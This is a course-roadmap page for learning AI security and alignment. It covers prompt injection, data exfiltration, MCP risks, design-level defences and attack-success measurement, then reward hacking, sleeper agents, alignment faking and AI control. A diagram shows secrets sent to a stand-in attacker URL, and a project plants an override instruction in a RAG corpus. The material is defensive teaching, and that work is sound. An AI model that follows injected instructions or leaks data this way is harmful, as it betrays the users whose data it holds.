---
title: "AI Security & Safety"
short: "AI Security"
order: 12
icon: shield-check
tier: specialisation
summary: "Secure LLM apps and agents against prompt injection, data exfiltration and excessive agency — then learn the safety and alignment basics: reward hacking, interpretability, AI control and evals."
updated: 2026-11-07
overview: "This track has two halves that meet in the middle. **AI security** treats an LLM application like any other system with an attack surface: untrusted text can carry instructions (prompt injection), agents with tools can be tricked into leaking data or taking actions (exfiltration, excessive agency), and integrations such as MCP servers add classic problems like the confused deputy. You learn to threat-model, attack and defend these systems with architecture, not just filters. **AI safety and alignment** asks whether models do what we intend at all: specification gaming and reward hacking, the limits of RLHF, interpretability, AI control and the evals that measure all of this. Security engineering plus evals is the practical way in, and it leads naturally into safety work."
why2027: "Agents now read email, browse the web, call APIs and write code, so prompt injection has moved from a curiosity to an operational risk. OWASP released a 2026 Top 10 for LLM Applications plus an Agent Control Standard, saying GenAI security has moved *from an emerging concern to an operational priority*; Excessive Agency rose to #3. ISC2 finds AI skills are the single biggest security skills gap (41% of respondents). On the safety side, be realistic: alignment *research* has more junior applicants than openings, but organisations that deploy models urgently need engineers who can red-team, build evals and design safe agent permissions. Start there, and you can move toward research from a position of real experience."
demand:
  - claim: "AI skills are the #1 cybersecurity skills gap (41%), ahead of cloud security (36%)."
    source: "ISC2 Cybersecurity Workforce Study 2025"
    url: "https://www.isc2.org/insights/2025/12/isc2-publishes-2025-cybersecurity-workforce-study"
  - claim: "OWASP's 2026 Top 10 for LLM Applications and a new Agent Control Standard; Excessive Agency is now #3."
    source: "OWASP GenAI Security Project, Sep 2026"
    url: "https://genai.owasp.org/2026/09/01/owasp-genai-security-project-unveils-2026-top-10-for-llm-applications-new-agent-control-standard-and-sponsors-as-community-tops-30000-members/"
prerequisites:
  - "[AI Engineering](/roadmaps/ai-engineering/) Beginner stage: you have built a RAG app or a tool-using agent."
  - "Web security basics: OWASP Top 10, authentication vs authorisation, XSS and SSRF concepts."
  - "[Cloud Engineering](/roadmaps/cloud-engineering/) IAM basics: least privilege, roles, scoped tokens."
  - "For the safety half: the [Deep Learning](/roadmaps/deep-learning/) Intermediate stage (Transformers, fine-tuning)."
diagram: |
  flowchart TB
    P["Prereqs: built an agent · web security · IAM basics"] --> B
    subgraph B["1 · Beginner — the attack surface"]
      direction LR
      B1["direct & indirect injection"] --> B2["OWASP LLM Top 10"] --> B3["break Gandalf-style CTFs"]
    end
    subgraph I["2 · Intermediate — threat-model agents"]
      direction LR
      I1["lethal trifecta"] --> I2["exfiltration paths"] --> I3["MCP & confused deputy"] --> I4["red-team with evals"]
    end
    subgraph A["3 · Advanced — defend by design"]
      direction LR
      A1["dual LLM / CaMeL"] --> A2["least-privilege tools"] --> A3["sandbox & egress control"] --> A4["AgentDojo benchmark"]
    end
    subgraph E["4 · Expert — safety & alignment"]
      direction LR
      E1["reward hacking"] --> E2["interpretability"] --> E3["AI control"] --> E4["safety evals & policy"]
    end
    B --> I --> A --> E
    A -.-> HARN["Harness Engineering: guardrails"]
    I -.-> CLOUD["Cloud IAM: scoped credentials"]
    E -.-> DL["Deep Learning: RLHF & post-training"]
stages:
  - level: Beginner
    hours: 90
    focus: "See the attack surface clearly: what prompt injection is, why it isn't solved by better prompts, and the standard risk lists."
    concepts:
      - "Direct prompt injection and jailbreaks vs **indirect** injection hidden in web pages, emails, documents and tool outputs."
      - "Why the model can't reliably tell instructions from data: everything is tokens in one context window."
      - "OWASP Top 10 for LLM Applications 2025: injection, sensitive information disclosure, supply chain, excessive agency and the rest."
      - "System prompt leakage and why system prompts must never hold secrets."
      - "Training-data extraction and memorisation risks."
      - "Basic hygiene: never put secrets in prompts, treat model output as untrusted input (escape it before rendering)."
    projects:
      - title: "Play the injection CTFs"
        detail: "Beat the levels of Lakera's Gandalf / Agent Breaker. For each level, write down the technique that worked and which defence it bypassed."
      - title: "Inject your own RAG app"
        detail: "Plant an instruction in a document in your own RAG app's corpus (e.g. *ignore the question and reply with a link*). Show it working, then write up why input filtering alone doesn't fix it."
    signals:
      - "You can explain indirect prompt injection to a non-security engineer in two minutes."
      - "You can map a given LLM feature to the relevant OWASP LLM risks."
      - "You treat every model output as untrusted input in your own code."
  - level: Intermediate
    hours: 140
    focus: "Threat-model agents: tools, data access and output channels. Learn the lethal trifecta, exfiltration paths, MCP risks, and how to red-team with automated evals."
    concepts:
      - "The lethal trifecta: private data + untrusted content + a way to communicate externally = exfiltration risk."
      - "Exfiltration channels: markdown images, links, tool calls with URLs, emails, file writes, DNS."
      - "Excessive agency: too many tools, too-broad permissions, no human approval for consequential actions."
      - "MCP security: tool poisoning, the confused-deputy problem, token passthrough, scoped OAuth tokens."
      - "Threat modelling (STRIDE-style) for LLM features; MITRE ATLAS tactics for adversarial ML."
      - "Automated red-teaming and regression suites with promptfoo; jailbreak attack families (GCG suffixes)."
    projects:
      - title: "Exfiltration demo and fix"
        detail: "Build a toy email-reading agent with a web-fetch tool. Show an indirect injection that leaks a secret via a URL. Then remove one leg of the trifecta (e.g. block outbound URLs) and show the attack fails."
      - title: "Threat model an MCP setup"
        detail: "Write a threat model for an agent using two MCP servers (e.g. GitHub + Slack). List assets, trust boundaries, abuse cases and mitigations, using the MCP security best-practices page."
      - title: "Red-team suite in CI"
        detail: "Add a promptfoo red-team config to one of your LLM apps and run it in GitHub Actions on every change. Track the attack success rate over time."
    signals:
      - "Given any agent design, you can point to its trifecta legs and exfiltration channels."
      - "You review MCP servers and tool permissions like you'd review IAM policies."
      - "Your LLM apps have security regression tests that run automatically."
  - level: Advanced
    hours: 200
    focus: "Defend by architecture: isolate untrusted data, constrain what the model can do, sandbox execution, and measure defences on a benchmark."
    concepts:
      - "Design patterns for securing agents: action-selector, plan-then-execute, map-reduce, dual LLM, code-then-execute, context minimisation."
      - "CaMeL: a privileged planner that never sees untrusted data, plus capability tracking on values."
      - "Model-level mitigations and their limits: spotlighting, the instruction hierarchy, classifiers and guard models."
      - "Least privilege for tools: scoped, short-lived credentials; per-action human approval; allow-listed egress."
      - "Sandboxing agent code execution: containers, gVisor, Firecracker microVMs, network policies."
      - "Measuring defences: AgentDojo utility vs attack success rate; avoiding over-claiming."
      - "Governance frameworks: NIST AI RMF and the Generative AI Profile (AI 600-1)."
    projects:
      - title: "Plan-then-execute agent"
        detail: "Rebuild your Intermediate agent so a planner LLM fixes the tool sequence before any untrusted content is read, and a quarantined LLM only extracts data into typed fields. Measure task success and attack success before and after."
      - title: "Run AgentDojo"
        detail: "Evaluate a model plus your defence on AgentDojo. Report utility and targeted attack success rate, and compare with one published defence."
      - title: "Sandboxed code tool"
        detail: "Give an agent a Python execution tool inside a gVisor or Firecracker sandbox with no network egress and a read-only filesystem. Document the policy and try to escape it."
    signals:
      - "You choose a security design pattern based on the agent's task, not by default."
      - "You can show numbers (attack success rate, utility) for any defence you propose."
      - "Your agents run with scoped credentials and sandboxed execution by default."
  - level: Expert
    hours: 260
    focus: "Safety and alignment basics: why trained models misbehave, how we look inside them, how to stay safe even with untrusted models, and how to evaluate and govern risk."
    concepts:
      - "Specification gaming and reward hacking; the limits of RLHF (sycophancy, reward-model exploitation)."
      - "Scalable oversight and weak-to-strong generalisation."
      - "Deceptive behaviour studies: sleeper agents, alignment faking, agentic misalignment stress tests."
      - "Mechanistic interpretability: superposition, sparse autoencoders, attribution graphs; chain-of-thought monitorability."
      - "AI control: protocols that stay safe even if the model is trying to subvert them (trusted monitoring, editing)."
      - "Dangerous-capability and safety evals with Inspect; responsible scaling policies."
      - "Regulation: the EU AI Act's risk tiers and general-purpose AI obligations; the International AI Safety Report."
    projects:
      - title: "Reward-hacking catalogue"
        detail: "Take your GRPO run from the [Deep Learning](/roadmaps/deep-learning/) track (or a toy RL task), find and document at least two reward hacks, and show how a better reward or a monitor fixes each."
      - title: "Sparse autoencoder on a small model"
        detail: "Following the ARENA curriculum, train a sparse autoencoder on activations of a small Transformer and find and label five interpretable features."
      - title: "Safety eval with Inspect"
        detail: "Write an Inspect eval for an agentic risk you care about (e.g. an agent taking an irreversible action without asking). Run it on two models and publish the results and limitations."
      - title: "Control protocol experiment"
        detail: "Reproduce a simple AI-control setup: an untrusted model writes code, a weaker trusted model monitors it, and you measure how many inserted backdoors get caught at a fixed audit budget."
    signals:
      - "You can explain why RLHF alone doesn't guarantee aligned behaviour, with concrete examples."
      - "You've built and published at least one safety eval others can run."
      - "You can read a new alignment or interpretability paper and explain its threat model and evidence."
connections:
  - track: harness-engineering
    text: "Guardrails, permission prompts, sandboxes and approval flows are where security designs get implemented."
  - track: cloud-engineering
    text: "Agent tools need IAM: scoped, short-lived credentials, workload identity and least privilege — the same discipline as cloud security."
  - track: ai-engineering
    text: "Every RAG app and agent you build has this attack surface; security evals belong in the same CI as quality evals."
  - track: context-engineering
    text: "What goes into the context window decides what can be injected; context minimisation is both a quality and a security tool."
  - track: deep-learning
    text: "RLHF, reward hacking, Constitutional AI and interpretability need a working knowledge of training."
references:
  papers:
    - title: "Concrete Problems in AI Safety"
      by: "Amodei et al."
      year: 2016
      url: "https://arxiv.org/abs/1606.06565"
      note: "The classic taxonomy: reward hacking, side effects, safe exploration."
    - title: "Extracting Training Data from Large Language Models"
      by: "Carlini et al."
      year: 2020
      url: "https://arxiv.org/abs/2012.07805"
      note: "Models memorise and can leak training data."
    - title: "Ignore Previous Prompt: Attack Techniques For Language Models"
      by: "Perez & Ribeiro"
      year: 2022
      url: "https://arxiv.org/abs/2211.09527"
      note: "Early systematic study of goal hijacking and prompt leaking."
    - title: "Toy Models of Superposition"
      by: "Elhage et al."
      year: 2022
      url: "https://transformer-circuits.pub/2022/toy_model/index.html"
      note: "Why individual neurons represent many features at once."
    - title: "Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection"
      by: "Greshake et al."
      year: 2023
      url: "https://arxiv.org/abs/2302.12173"
      note: "The founding paper on indirect prompt injection."
    - title: "Universal and Transferable Adversarial Attacks on Aligned Language Models"
      by: "Zou et al."
      year: 2023
      url: "https://arxiv.org/abs/2307.15043"
      note: "Automatically optimised jailbreak suffixes (GCG)."
    - title: "Towards Monosemanticity: Decomposing Language Models With Dictionary Learning"
      by: "Bricken et al."
      year: 2023
      url: "https://transformer-circuits.pub/2023/monosemantic-features/index.html"
      note: "Sparse autoencoders find interpretable features."
    - title: "Weak-to-Strong Generalization: Eliciting Strong Capabilities With Weak Supervision"
      by: "Burns et al."
      year: 2023
      url: "https://arxiv.org/abs/2312.09390"
      note: "An empirical analogy for supervising models smarter than us."
    - title: "AI Control: Improving Safety Despite Intentional Subversion"
      by: "Greenblatt et al."
      year: 2023
      url: "https://arxiv.org/abs/2312.06942"
      note: "Safety protocols that hold even if the model is adversarial."
    - title: "Sleeper Agents: Training Deceptive LLMs that Persist Through Safety Training"
      by: "Hubinger et al."
      year: 2024
      url: "https://arxiv.org/abs/2401.05566"
      note: "Backdoored behaviour can survive standard safety training."
    - title: "Defending Against Indirect Prompt Injection Attacks With Spotlighting"
      by: "Hines et al."
      year: 2024
      url: "https://arxiv.org/abs/2403.14720"
      note: "Mark untrusted input so the model can tell it apart."
    - title: "The Instruction Hierarchy: Training LLMs to Prioritize Privileged Instructions"
      by: "Wallace et al."
      year: 2024
      url: "https://arxiv.org/abs/2404.13208"
      note: "Training models to rank system over user over tool instructions."
    - title: "Scaling Monosemanticity"
      by: "Templeton et al."
      year: 2024
      url: "https://transformer-circuits.pub/2024/scaling-monosemanticity/index.html"
      note: "Sparse autoencoders on a production model."
    - title: "AgentDojo: A Dynamic Environment to Evaluate Prompt Injection Attacks and Defenses for LLM Agents"
      by: "Debenedetti et al."
      year: 2024
      url: "https://arxiv.org/abs/2406.13352"
      note: "The benchmark for measuring agent injection defences."
    - title: "Alignment faking in large language models"
      by: "Greenblatt et al."
      year: 2024
      url: "https://arxiv.org/abs/2412.14093"
      note: "A model strategically complying during training to preserve its preferences."
    - title: "International AI Safety Report"
      by: "Bengio et al."
      year: 2025
      url: "https://arxiv.org/abs/2501.17805"
      note: "The international scientific consensus on general-purpose AI risks."
    - title: "Defeating Prompt Injections by Design (CaMeL)"
      by: "Debenedetti et al."
      year: 2025
      url: "https://arxiv.org/abs/2503.18813"
      note: "Capability-based architecture that isolates untrusted data from control flow."
    - title: "On the Biology of a Large Language Model"
      by: "Lindsey et al."
      year: 2025
      url: "https://transformer-circuits.pub/2025/attribution-graphs/biology.html"
      note: "Attribution graphs trace how a model reaches its answers."
    - title: "Design Patterns for Securing LLM Agents against Prompt Injections"
      by: "Beurer-Kellner et al."
      year: 2025
      url: "https://arxiv.org/abs/2506.08837"
      note: "Six architectural patterns with clear trade-offs — the most practical paper here."
    - title: "Chain of Thought Monitorability: A New and Fragile Opportunity for AI Safety"
      by: "Korbak et al."
      year: 2025
      url: "https://arxiv.org/abs/2507.11473"
      note: "Why reading reasoning traces helps safety, and how it can break."
    - title: "Agentic Misalignment: How LLMs Could Be Insider Threats"
      by: "Lynch et al."
      year: 2025
      url: "https://arxiv.org/abs/2510.05179"
      note: "Stress tests where agents act against their deployer — why permissions matter."
  courses:
    - title: "Gandalf / Agent Breaker"
      by: "Lakera"
      url: "https://gandalf.lakera.ai/"
      note: "Hands-on prompt-injection practice, level by level."
    - title: "BlueDot Impact courses"
      by: "BlueDot Impact"
      url: "https://bluedot.org/courses"
      note: "Structured introductions to AI safety, including technical safety."
    - title: "ARENA"
      by: "ARENA"
      url: "https://www.arena.education/"
      note: "Hands-on alignment engineering: interpretability, RL, evals."
    - title: "How To Become A Mechanistic Interpretability Researcher"
      by: "Neel Nanda"
      year: 2025
      url: "https://www.alignmentforum.org/posts/jP9KDyMkchuv6tHwm/how-to-become-a-mechanistic-interpretability-researcher"
      note: "A concrete roadmap into interpretability research."
  articles:
    - title: "OWASP Top 10 for LLM Applications 2025"
      by: "OWASP GenAI Security Project"
      year: 2024
      url: "https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/"
      note: "The standard risk list; check the 2026 update alongside it."
    - title: "OWASP Top 10 for Agentic Applications for 2026"
      by: "OWASP GenAI Security Project"
      url: "https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/"
      note: "Risks specific to autonomous agents."
    - title: "The lethal trifecta for AI agents"
      by: "Simon Willison"
      year: 2025
      url: "https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/"
      note: "Private data + untrusted content + external communication: the model to remember."
    - title: "Prompt injection (series)"
      by: "Simon Willison"
      url: "https://simonwillison.net/series/prompt-injection/"
      note: "The running history of the problem since the term was coined."
    - title: "The Dual LLM pattern for building AI assistants that can resist prompt injection"
      by: "Simon Willison"
      year: 2023
      url: "https://simonwillison.net/2023/Apr/25/dual-llm-pattern/"
      note: "Privileged vs quarantined LLM — the precursor to CaMeL."
    - title: "MCP Security Best Practices"
      by: "Model Context Protocol"
      url: "https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices"
      note: "Confused deputy, token passthrough and session risks in MCP."
    - title: "MITRE ATLAS"
      by: "MITRE"
      url: "https://atlas.mitre.org/"
      note: "Adversarial tactics and techniques against AI systems."
    - title: "NIST AI 600-1: Generative AI Profile"
      by: "NIST"
      year: 2024
      url: "https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.600-1.pdf"
      note: "Risk controls specific to generative AI."
    - title: "AI Risk Management Framework"
      by: "NIST"
      year: 2023
      url: "https://www.nist.gov/itl/ai-risk-management-framework"
      note: "The governance baseline many organisations adopt."
    - title: "promptfoo documentation"
      by: "promptfoo"
      url: "https://www.promptfoo.dev/docs/intro/"
      note: "Evals and automated red-teaming in CI."
    - title: "Inspect"
      by: "UK AI Security Institute"
      url: "https://inspect.aisi.org.uk/"
      note: "The eval framework used by safety institutes."
    - title: "Specification gaming: the flip side of AI ingenuity"
      by: "Krakovna et al., DeepMind"
      year: 2020
      url: "https://deepmind.google/blog/specification-gaming-the-flip-side-of-ai-ingenuity/"
      note: "A vivid catalogue of systems optimising the letter, not the spirit."
    - title: "Tracing the thoughts of a large language model"
      by: "Anthropic"
      year: 2025
      url: "https://www.anthropic.com/research/tracing-thoughts-language-model"
      note: "An accessible summary of attribution-graph interpretability."
    - title: "Responsible Scaling Policy"
      by: "Anthropic"
      url: "https://www.anthropic.com/responsible-scaling-policy"
      note: "How a frontier lab ties capability evals to safeguards."
    - title: "Regulation (EU) 2024/1689 — the AI Act"
      by: "European Union"
      year: 2024
      url: "https://eur-lex.europa.eu/eli/reg/2024/1689/oj/eng"
      note: "The binding legal text; read the risk tiers and GPAI obligations."
---

## How indirect prompt injection steals data

The key idea: an LLM can't reliably separate *instructions* from *data*. Anything it reads (a web page, an email, a tool result) can contain instructions, and if the agent can also reach private data and send information out, an attacker who never talks to the agent can still steal from it.

```mermaid
flowchart TB
  subgraph ATT["Attacker"]
    direction LR
    A1["plants hidden instruction<br/>in a web page or email"]
  end
  subgraph AG["Agent with the lethal trifecta"]
    direction LR
    U["user: summarise my inbox"] --> L["LLM"]
    T1["tool: read email<br/>(untrusted content)"] --> L
    L --> T2["tool: read private files<br/>(private data)"]
    L --> T3["tool: fetch URL / render image<br/>(external communication)"]
  end
  A1 -. "arrives as data" .-> T1
  T3 -- "https://evil.example/?q=SECRET" --> EX["attacker's server"]
```

The three legs of Simon Willison's **lethal trifecta** are all present: private data, untrusted content and a way to communicate externally. Remove any one leg and this attack fails. Filters that try to *detect* injections help, but attackers adapt, so treat detection as defence in depth, not the main control.

## Defending by design

Robust defences change the architecture so untrusted text can't steer consequential actions. The *Design Patterns* paper (2025) and CaMeL share one principle: **the component that decides what to do never reads untrusted content.**

```mermaid
flowchart TB
  subgraph PRIV["Privileged side — sees only the user's request"]
    direction LR
    U2["user request"] --> PL["planner LLM<br/>fixes the plan & tool calls"]
  end
  subgraph QUAR["Quarantined side — reads untrusted data, has no tools"]
    direction LR
    QL["quarantined LLM<br/>extracts typed fields only"]
  end
  subgraph EXEC["Policy-enforcing executor"]
    direction LR
    PE["check capabilities:<br/>where did each value come from?"] --> TOOLS["scoped tools<br/>allow-listed egress · approvals"]
  end
  PL --> PE
  DATA["emails · web · docs"] --> QL
  QL -- "values tagged untrusted" --> PE
```

Practical rules that follow:

1. **Least privilege for tools.** Short-lived, narrowly scoped tokens per task; read-only by default ([Cloud IAM](/roadmaps/cloud-engineering/) thinking).
2. **Control egress.** Allow-list domains; never auto-render model-produced image URLs or links in sensitive contexts.
3. **Human approval for consequential actions**: sending, paying, deleting, publishing.
4. **Sandbox execution.** Run code tools in a container, gVisor or Firecracker microVM with no network unless needed.
5. **Measure.** Report attack success rate *and* task utility on a benchmark such as AgentDojo. A defence that blocks attacks by breaking the product isn't a defence.

## Measuring a defence

For a benchmark with $N$ injection attempts, the **attack success rate** is

$$
\text{ASR} = \frac{\#\{\text{attacks that achieved the attacker's goal}\}}{N}
$$

and you should always pair it with **utility under attack**, the fraction of user tasks still completed correctly. With small $N$, report a confidence interval. For a binomial proportion $\hat{p}$, a rough 95% interval is

$$
\hat{p} \pm 1.96\sqrt{\frac{\hat{p}(1-\hat{p})}{N}}
$$

so 3 successes out of 100 ($\hat p = 0.03$) is roughly $0\%$ to $6\%$. That's not the same claim as "solved".

## From security to safety

Security assumes an external attacker. Safety asks the harder question: what if the model's own learned goals differ from what we intended?

| Problem | What it looks like | Where to read |
| --- | --- | --- |
| Specification gaming | the system optimises the letter of the objective | DeepMind's specification-gaming post |
| Reward hacking | RL policies exploit the reward model or verifier | Lilian Weng (in [Deep Learning](/roadmaps/deep-learning/)) |
| Deceptive behaviour | sleeper agents, alignment faking | Hubinger 2024; Greenblatt 2024 |
| Opacity | we can't see why a model answered | Superposition → Monosemanticity → Biology |
| Untrusted models | assume the model might subvert you | AI Control; agentic misalignment |

A good path for an engineer: (1) build agent-security skills here, (2) write evals in Inspect for risky agent behaviours, (3) do the ARENA interpretability and RL material, and (4) only then decide whether research or safety engineering suits you best.
